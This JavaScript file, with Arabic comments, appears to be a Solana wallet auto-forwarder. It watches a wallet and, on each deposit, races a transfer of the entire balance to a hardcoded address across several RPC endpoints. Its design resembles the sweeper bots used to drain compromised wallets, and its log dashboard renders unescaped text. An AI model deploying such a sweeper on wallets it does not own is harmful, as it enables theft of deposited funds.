// monitor-detailed.js
require('dotenv').config();
const express = require('express');
const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58').default;
const app = express();
app.use(express.json());

// ثابت: العنوان الهدف
const TARGET_ADDRESS = new PublicKey('XX4k8NidriAUsGKTjAvYHonxcKJj99R859vMAAGSLQ9');

// التحقق من متغيرات البيئة
if (!process.env.RPC_URL || !process.env.PRIVATE_KEY) {
  console.error('❌ يجب ضبط RPC_URL و PRIVATE_KEY في ملف .env');
  process.exit(1);
}

// روابط RPC إضافية (اختيارية)
const rpcUrls = [process.env.RPC_URL];
if (process.env.RPC_URL2) {
  rpcUrls.push(process.env.RPC_URL2);
  console.log('✅ تم إضافة RPC_URL2');
}
if (process.env.RPC_URL3) {
  rpcUrls.push(process.env.RPC_URL3);
  console.log('✅ تم إضافة RPC_URL3');
}

// تطبيع جميع روابط RPC
function normalizeRpc(url) {
  let normalizedUrl = url.trim();
  if (normalizedUrl.startsWith('wss://')) {
    console.warn(`⚠️ تحويل ${url} من wss:// إلى https://`);
    normalizedUrl = 'https://' + normalizedUrl.slice('wss://'.length);
  } else if (normalizedUrl.startsWith('ws://')) {
    console.warn(`⚠️ تحويل ${url} من ws:// إلى http://`);
    normalizedUrl = 'http://' + normalizedUrl.slice('ws://'.length);
  } else if (!normalizedUrl.startsWith('http://') && !normalizedUrl.startsWith('https://')) {
    console.error(`❌ ${url} يجب أن يبدأ بـ http(s) أو ws(s)`);
    process.exit(1);
  }
  return normalizedUrl;
}

// تطبيع جميع الروابط وإنشاء connections
const normalizedRpcs = rpcUrls.map(normalizeRpc);
const connections = normalizedRpcs.map(url => ({
  url,
  connection: new Connection(url, 'processed'),
  name: url.includes('quiknode') ? 'QuickNode' : 
        url.includes('alchemy') ? 'Alchemy' :
        url.includes('helius') ? 'Helius' : 'RPC'
}));

console.log(`🔗 تم إنشاء ${connections.length} اتصالات RPC`);

// الاتصال الرئيسي (للمراقبة)
const primaryConnection = connections[0].connection;

// تحميل المحفظة
let wallet;
try {
  const sk = bs58.decode(process.env.PRIVATE_KEY.trim());
  wallet = Keypair.fromSecretKey(sk);
} catch (err) {
  console.error('❌ خطأ في المفتاح الخاص:', err.message);
  process.exit(1);
}

console.log('🚀 Forwarder detailed started');
console.log('Wallet:', wallet.publicKey.toString());
console.log('Target:', TARGET_ADDRESS.toString());
console.log('Primary RPC:', normalizedRpcs[0]);
console.log(`📡 عدد RPCs المفعلة: ${connections.length}`);

// السجلات
const logs = [];
const sendDetails = [];

function addLog(type, msg, extra = {}) {
  const entry = { type, msg, timestamp: new Date().toISOString(), ...extra };
  logs.unshift(entry);
  if (logs.length > 1000) logs.splice(1000);
  console.log(`[${type.toUpperCase()}] ${entry.timestamp} - ${msg}`);
}

function addSendDetail(detail) {
  const entry = { id: Date.now() + '-' + Math.floor(Math.random()*1000), timestamp: new Date().toISOString(), ...detail };
  sendDetails.unshift(entry);
  if (sendDetails.length > 500) sendDetails.splice(500);
  
  // إظهار تفصيل أوقات RPC لتحديد مصدر التأخير
  let rpcBreakdown = '';
  if (entry.rpcLatency) {
    const rpcTimes = Object.entries(entry.rpcLatency)
      .map(([key, value]) => `${key}:${value}ms`)
      .join(' | ');
    rpcBreakdown = ` RPC_TIMES: ${rpcTimes}`;
    
    // إضافة النسبة المئوية للـ RPC
    if (entry.rpcPercentage !== undefined) {
      rpcBreakdown += ` | RPC_USAGE: ${entry.rpcPercentage}% | LOCAL: ${entry.localProcessingMs}ms`;
    }
  }
  
  console.log(`[SEND_DETAIL] stage=${entry.stage} sig=${entry.signature||'N/A'} total=${entry.totalDurationMs||'N/A'}ms${rpcBreakdown}`);
}

// إرسال معاملة إلى RPC واحد
async function sendToSingleRPC(rpcInfo, rawTransaction, amount) {
  const sendStart = Date.now();
  try {
    const sig = await rpcInfo.connection.sendRawTransaction(rawTransaction, { 
      skipPreflight: true, 
      preflightCommitment: 'processed', 
      maxRetries: 0 
    });
    const sendTime = Date.now() - sendStart;
    return {
      success: true,
      signature: sig,
      rpcName: rpcInfo.name,
      rpcUrl: rpcInfo.url,
      sendTimeMs: sendTime,
      amount
    };
  } catch (err) {
    return {
      success: false,
      error: String(err),
      rpcName: rpcInfo.name,
      rpcUrl: rpcInfo.url,
      sendTimeMs: Date.now() - sendStart
    };
  }
}

// البث المتوازي إلى جميع RPCs
async function broadcastToAllRPCs(rawTransaction, amount) {
  const broadcastStart = Date.now();
  
  // إرسال لكل RPCs بالتوازي
  const sendPromises = connections.map(rpcInfo => 
    sendToSingleRPC(rpcInfo, rawTransaction, amount)
  );
  
  try {
    // استخدام Promise.race للحصول على أسرع استجابة ناجحة
    const result = await Promise.race(sendPromises);
    
    // الحصول على نتائج باقي الـ RPCs (لا ننتظرها)
    Promise.allSettled(sendPromises).then(results => {
      const successCount = results.filter(r => r.value?.success).length;
      const failCount = results.filter(r => !r.value?.success).length;
      addLog('broadcast', `البث المتوازي: ${successCount} نجح، ${failCount} فشل`);
    });
    
    return {
      ...result,
      broadcastTimeMs: Date.now() - broadcastStart,
      totalRpcs: connections.length
    };
    
  } catch (err) {
    return {
      success: false,
      error: String(err),
      broadcastTimeMs: Date.now() - broadcastStart,
      totalRpcs: connections.length
    };
  }
}

// إرسال كل الرصيد مع قياسات زمنية
async function forwardFundsDetailed(newBalance) {
  const detail = {
    stage: 'start',
    lamportsBalance: newBalance,
    lamportsToSend: null,
    rpcLatency: {},
    signature: null,
    error: null
  };
  const t0 = Date.now();

  try {
    const feeReserve = 5000;
    const amount = newBalance - feeReserve;
    if (amount <= 0) {
      addLog('warning', 'الرصيد لا يغطي الرسوم', { balance: newBalance });
      detail.stage = 'insufficient';
      addSendDetail({ ...detail, totalDurationMs: Date.now()-t0 });
      return;
    }
    detail.lamportsToSend = amount;

    // blockhash - استخدام الأسرع من الـ RPC الرئيسي
    const bhStart = Date.now();
    const { blockhash } = await primaryConnection.getLatestBlockhash('processed');
    detail.rpcLatency.getBlockhashMs = Date.now() - bhStart;

    // بناء المعاملة محسن - تحضير الـ instruction مسبقاً 
    const transferInstruction = SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: TARGET_ADDRESS,
      lamports: amount
    });
    
    // بناء وتوقيع محسن
    const tx = new Transaction({ 
      recentBlockhash: blockhash, 
      feePayer: wallet.publicKey 
    }).add(transferInstruction);
    
    tx.sign(wallet);
    const raw = tx.serialize({ requireAllSignatures: false });

    // البث المتوازي إلى جميع RPCs
    const broadcastResult = await broadcastToAllRPCs(raw, amount);
    
    if (!broadcastResult.success) {
      detail.error = broadcastResult.error;
      detail.stage = 'broadcast_failed';
      detail.rpcLatency.broadcastMs = broadcastResult.broadcastTimeMs;
      
      // معالجة أفضل للأخطاء مع skipPreflight: true
      const errMsg = String(broadcastResult.error);
      if (errMsg.includes('insufficient') || errMsg.includes('rent')) {
        addLog('warning', `رسوم غير كافية أو مشكلة رصيد: ${errMsg}`);
      } else if (errMsg.includes('blockhash') || errMsg.includes('expired')) {
        addLog('warning', `blockhash منتهي الصلاحية: ${errMsg}`);
      } else {
        addLog('error', `فشل البث المتوازي: ${errMsg}`);
      }
      addSendDetail({ ...detail, totalDurationMs: Date.now()-t0 });
      return;
    }
    
    // نجح البث
    detail.signature = broadcastResult.signature;
    detail.rpcLatency.broadcastMs = broadcastResult.broadcastTimeMs;
    detail.winnerRpc = broadcastResult.rpcName;
    detail.totalRpcs = broadcastResult.totalRpcs;
    addLog('send', `✅ بث متوازي إلى ${broadcastResult.totalRpcs} RPCs - الفائز: ${broadcastResult.rpcName} (${broadcastResult.sendTimeMs}ms)`, { 
      signature: broadcastResult.signature 
    });
    detail.stage = 'sent';

    // إنهاء المعالجة بعد الإرسال الناجح (توفير موارد RPC)

    detail.totalDurationMs = Date.now() - t0;
    
    addSendDetail(detail);

  } catch (err) {
    detail.error = String(err);
    detail.stage = 'exception';
    detail.totalDurationMs = Date.now() - t0;
    addLog('error', `Exception أثناء الإرسال: ${String(err)}`);
    addSendDetail(detail);
  }
}

// مراقبة الحساب
let subscriptionId = null;

async function startMonitor() {
  try {
    const initialBalance = await primaryConnection.getBalance(wallet.publicKey, 'processed');
    addLog('info', `الرصيد الابتدائي: ${initialBalance / LAMPORTS_PER_SOL} SOL`);
    if (initialBalance > 0) forwardFundsDetailed(initialBalance);

    subscriptionId = primaryConnection.onLogs(
      wallet.publicKey,
      async (log) => {
        try {
          const balance = await primaryConnection.getBalance(wallet.publicKey, 'processed');
          if (balance > 0) {
            addLog('receive', `💰 معاملة جديدة - ${log.signature} - الرصيد: ${balance/LAMPORTS_PER_SOL} SOL`);
            forwardFundsDetailed(balance);
          }
        } catch (error) {
          addLog('error', `خطأ في onLogs: ${error.message}`);
        }
      },
      "processed"
    );

    addLog('info', `تم الاشتراك عبر ${connections[0].name} (id=${subscriptionId})`);
  } catch (err) {
    addLog('error', `فشل بدء المراقبة: ${String(err)}`);
  }
}

// واجهة بسيطة
app.get('/', (req,res)=>{
  res.send(`<!doctype html>
<html lang="ar"><head><meta charset="utf-8"><title>سجلات</title>
<style>body{font-family:Tahoma;direction:rtl;background:#f5f6fa;padding:20px}
.log{background:#fff;margin:8px 0;padding:8px;border-radius:6px;border-right:5px solid #ccc}
.log.send{border-color:#007bff}.log.receive{border-color:#28a745}.log.error{border-color:#dc3545}.log.info{border-color:#6c757d}
small{color:#555}.pre{white-space:pre-wrap;font-family:monospace;background:#f8f9fa;padding:6px;border-radius:4px}
</style></head><body>
<h1>📜 السجلات</h1>
<div id="logs"></div>
<h2>🔎 تفاصيل الإرسال</h2>
<div id="details"></div>
<script>
async function load(){
  const l = await fetch('/api/logs').then(r=>r.json());
  document.getElementById('logs').innerHTML = l.map(x=>'<div class="log '+x.type+'"><b>'+x.type+'</b>: '+x.msg+'<br><small>'+new Date(x.timestamp).toLocaleString()+'</small></div>').join('');
  const d = await fetch('/api/send-details?limit=5').then(r=>r.json());
  document.getElementById('details').innerHTML = d.map(x=>'<div class="log send"><div class="pre">'+JSON.stringify(x,null,2)+'</div></div>').join('');
}
load();setInterval(load,2000);
</script></body></html>`);
});

app.get('/api/logs', (req,res)=>res.json(logs));
app.get('/api/send-details',(req,res)=>res.json(sendDetails.slice(0,parseInt(req.query.limit||'20'))));

const PORT = process.env.PORT||5000;
app.listen(PORT, ()=> console.log(`🌐 افتح http://localhost:${PORT}`));

// بدء المراقبة
startMonitor();
